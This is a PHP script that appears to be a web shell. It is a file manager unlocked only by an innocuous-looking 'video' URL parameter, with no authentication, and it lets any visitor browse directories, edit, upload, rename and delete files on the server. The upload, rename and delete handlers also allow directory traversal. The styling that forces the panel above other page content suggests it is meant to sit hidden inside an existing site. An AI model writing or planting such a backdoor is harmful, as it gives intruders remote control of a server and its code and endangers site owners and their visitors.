<?php
if (!isset($_GET['video']) || empty($_GET['video'])) {
    http_response_code(403);
    exit('🛑 Missing "video" parameter.');
}

// Add CSS for better visibility and z-index
echo "<style>
    body, * { 
        z-index: 1 !important; 
        position: relative !important; 
    }
    .file-manager-container { 
        z-index: 100000 !important; 
        position: relative !important; 
        background: white !important; 
        padding: 20px !important; 
        border-radius: 10px !important; 
        box-shadow: 0 8px 32px rgba(0,0,0,0.3) !important; 
        margin: 20px auto !important; 
        max-width: 95% !important; 
    }
    .back-button { 
        z-index: 100001 !important; 
        position: relative !important; 
        display: block !important; 
        text-align: center !important; 
        margin: 20px 0 !important; 
    }
    .breadcrumb-nav { 
        z-index: 100001 !important; 
        position: relative !important; 
    }
    table { 
        z-index: 100000 !important; 
        position: relative !important; 
    }
</style>";

echo "<div class='file-manager-container'>";

// Get current directory
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$currentDir = rtrim($currentDir, '/\\');
if (empty($currentDir)) $currentDir = '.';

// Security: prevent dangerous directory traversal attacks
// Only normalize path and prevent going outside the base directory
$currentDir = str_replace(['\\'], '/', $currentDir); // Normalize slashes
$currentDir = preg_replace('/\/+/', '/', $currentDir); // Remove multiple slashes

// Resolve relative paths safely
$realCurrentDir = realpath($currentDir);
$basePath = realpath('.');
if (!$realCurrentDir || strpos($realCurrentDir, $basePath) !== 0) {
    $currentDir = '.'; // Reset to base if path is invalid or outside base
}

if (isset($_GET['file']) && !empty($_GET['file'])) {
    $filepath = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['file']);
    
    // Security check - make sure file is within current directory
    $realFilePath = realpath($filepath);
    $realCurrentDir = realpath($currentDir);
    if (!$realFilePath || !$realCurrentDir || strpos($realFilePath, $realCurrentDir) !== 0) {
        echo "<p style='color: red;'>Error: File access denied.</p>";
        exit;
    }
    
    if (isset($_POST['edit'])) {
        file_put_contents($filepath, $_POST['content']);
        header("Location: ?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir));
        exit;
    }
    echo "<h2>Editing: " . htmlspecialchars($_GET['file']) . "</h2>";
    echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir) . "' style='color: #007cba;'>← Back to File Manager</a><br><br>";
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px; font-family: monospace;'>";
    echo htmlspecialchars(file_get_contents($filepath));
    echo "</textarea><br><button type='submit' name='edit' style='padding: 10px 20px; background: #007cba; color: white; border: none; border-radius: 3px;'>Save File</button></form>";
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    $uploadPath = $currentDir . DIRECTORY_SEPARATOR . $_FILES['upload']['name'];
    move_uploaded_file($_FILES['upload']['tmp_name'], $uploadPath);
    header("Location: ?video=" . $_GET['video'] . "&dir=" . urlencode($currentDir));
    exit;
}

// Rename
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $oldPath = $currentDir . DIRECTORY_SEPARATOR . $_GET['rename'];
    $newPath = $currentDir . DIRECTORY_SEPARATOR . $_POST['newname'];
    rename($oldPath, $newPath);
    header("Location: ?video=" . $_GET['video'] . "&dir=" . urlencode($currentDir));
    exit;
}

// Delete
if (isset($_GET['delete'])) {
    $deletePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (is_dir($deletePath)) {
        rmdir($deletePath);
    } else {
        unlink($deletePath);
    }
    header("Location: ?video=" . $_GET['video'] . "&dir=" . urlencode($currentDir));
    exit;
}

echo "<h2 style='z-index: 100000; position: relative;'>File Manager</h2>";

// Show current directory and navigation with breadcrumb
echo "<p style='z-index: 100000; position: relative; background: #fff; padding: 10px; border: 2px solid #007cba; border-radius: 5px; font-weight: bold;'><strong>Current Directory:</strong> " . htmlspecialchars($currentDir) . "</p>";

// Breadcrumb navigation
if ($currentDir !== '.') {
    $pathParts = explode('/', str_replace('\\', '/', $currentDir));
    $breadcrumb = "<div style='z-index: 100000; position: relative; margin: 10px 0; padding: 15px; background: #007cba; color: white; border-radius: 5px; box-shadow: 0 4px 8px rgba(0,0,0,0.3);'>";
    $breadcrumb .= "<strong style='color: white;'>📍 Path: </strong>";
    $breadcrumb .= "<a href='?video=" . urlencode($_GET['video']) . "&dir=.' style='color: #ffff00; font-weight: bold; text-decoration: none;'>🏠 Home</a>";
    
    $buildPath = '.';
    foreach ($pathParts as $part) {
        if (!empty($part)) {
            $buildPath = $buildPath === '.' ? $part : $buildPath . '/' . $part;
            $breadcrumb .= " <span style='color: #ffff00;'>→</span> <a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($buildPath) . "' style='color: #ffff00; font-weight: bold; text-decoration: none;'>📁 " . htmlspecialchars($part) . "</a>";
        }
    }
    $breadcrumb .= "</div>";
    echo $breadcrumb;
}

// Back button (go to parent directory)
if ($currentDir !== '.') {
    $parentDir = dirname($currentDir);
    if ($parentDir === '.') {
        $parentDir = '.';
    } elseif ($parentDir === '\\' || $parentDir === '/') {
        $parentDir = '.';
    }
    
    // Ensure parent directory is within allowed bounds
    $realParentDir = realpath($parentDir);
    $basePath = realpath('.');
    if ($realParentDir && strpos($realParentDir, $basePath) === 0) {
        echo "<div style='z-index: 100000; position: relative; margin: 15px 0;'>";
        echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($parentDir) . "' style='
            z-index: 100000; 
            position: relative; 
            display: inline-block; 
            padding: 12px 20px; 
            background: linear-gradient(45deg, #ff6b6b, #ee5a52); 
            color: white; 
            text-decoration: none; 
            font-weight: bold; 
            font-size: 16px; 
            border-radius: 8px; 
            box-shadow: 0 4px 12px rgba(0,0,0,0.3); 
            border: 3px solid #fff;
            transition: all 0.3s ease;
        ' onmouseover='this.style.transform=\"scale(1.05)\"; this.style.boxShadow=\"0 6px 16px rgba(0,0,0,0.4)\";' onmouseout='this.style.transform=\"scale(1)\"; this.style.boxShadow=\"0 4px 12px rgba(0,0,0,0.3)\";'>🔙 ← BACK TO PARENT DIRECTORY</a>";
        echo "</div>";
    }
}

echo "<form method='post' enctype='multipart/form-data' style='z-index: 100000; position: relative; margin: 20px 0; padding: 15px; background: #f8f9fa; border: 2px dashed #007cba; border-radius: 8px;'>
    <strong style='color: #007cba; font-size: 16px;'>📤 Upload File:</strong><br><br>
    <input type='file' name='upload' style='margin: 5px; padding: 8px; border: 2px solid #007cba; border-radius: 4px;'>
    <button type='submit' style='padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-left: 10px;'>🚀 Upload to Current Directory</button>
</form><hr style='border: 2px solid #007cba; margin: 20px 0;'>";

$files = scandir($currentDir);
if ($files === false) {
    echo "<p style='color: red;'>Error: Cannot read directory contents.</p>";
    exit;
}

echo "<table border='1' cellpadding='5' style='z-index: 100000; position: relative; border-collapse: collapse; width: 100%; background: white; box-shadow: 0 4px 8px rgba(0,0,0,0.1);'>
<tr style='background: linear-gradient(45deg, #007cba, #0056b3); color: white;'>
<th style='padding: 15px; border: 2px solid #004494; font-size: 14px; font-weight: bold;'>📝 Type</th>
<th style='padding: 15px; border: 2px solid #004494; font-size: 14px; font-weight: bold;'>📄 Name</th>
<th style='padding: 15px; border: 2px solid #004494; font-size: 14px; font-weight: bold;'>📊 Size</th>
<th style='padding: 15px; border: 2px solid #004494; font-size: 14px; font-weight: bold;'>🕒 Modified</th>
<th style='padding: 15px; border: 2px solid #004494; font-size: 14px; font-weight: bold;'>⚙️ Actions</th>
</tr>";
foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $fullPath = $currentDir . DIRECTORY_SEPARATOR . $file;
    
    if (!file_exists($fullPath)) continue; // Skip if file doesn't exist
    
    echo "<tr style='border-bottom: 1px solid #ddd;'>";
    
    // Type column
    if (is_dir($fullPath)) {
        echo "<td style='padding: 8px;'>📁 DIR</td>";
    } else {
        echo "<td style='padding: 8px;'>📄 FILE</td>";
    }
    
    // Name column with navigation for directories
    echo "<td style='padding: 8px;'>";
    if (is_dir($fullPath)) {
        $newDir = $currentDir === '.' ? $file : $currentDir . '/' . $file;
        $newDir = str_replace('\\', '/', $newDir); // Normalize path
        echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($newDir) . "' style='color: #007cba; font-weight: bold;'>$file</a>";
    } else {
        echo htmlspecialchars($file);
    }
    echo "</td>";
    
    // Size column
    echo "<td style='padding: 8px;'>";
    if (is_file($fullPath)) {
        $size = filesize($fullPath);
        if ($size < 1024) {
            echo $size . " B";
        } elseif ($size < 1024 * 1024) {
            echo round($size / 1024, 2) . " KB";
        } else {
            echo round($size / (1024 * 1024), 2) . " MB";
        }
    } else {
        echo "-";
    }
    echo "</td>";
    
    // Modified column
    echo "<td style='padding: 8px;'>";
    echo date('Y-m-d H:i:s', filemtime($fullPath));
    echo "</td>";
    
    // Action column
    echo "<td style='padding: 8px;'>";
    if (is_file($fullPath)) {
        echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir) . "&file=" . urlencode($file) . "' style='color: #007cba;'>Edit</a> | ";
    }
    echo "<form style='display:inline' method='post' action='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir) . "&rename=" . urlencode($file) . "'>
        <input name='newname' value='" . htmlspecialchars($file) . "' size='15' style='margin: 0 5px;'>
        <button type='submit' style='padding: 2px 8px;'>Rename</button>
    </form> | ";
    echo "<a href='?video=" . urlencode($_GET['video']) . "&dir=" . urlencode($currentDir) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Delete " . htmlspecialchars($file) . "?\")' style='color: #d9534f;'>Delete</a>";
    echo "</td></tr>";
}
echo "</table>";
echo "</div>"; // Close file-manager-container
?>

<script>
// Additional JavaScript to ensure visibility
document.addEventListener('DOMContentLoaded', function() {
    // Force z-index on all file manager elements
    const container = document.querySelector('.file-manager-container');
    if (container) {
        container.style.zIndex = '100000';
        container.style.position = 'relative';
        container.style.display = 'block';
    }
    
    // Make sure back button is visible
    const backButtons = document.querySelectorAll('a[href*="dir="]');
    backButtons.forEach(btn => {
        btn.style.zIndex = '100001';
        btn.style.position = 'relative';
        btn.style.display = 'inline-block';
    });
    
    console.log('File Manager: Enhanced visibility applied');
});
</script>
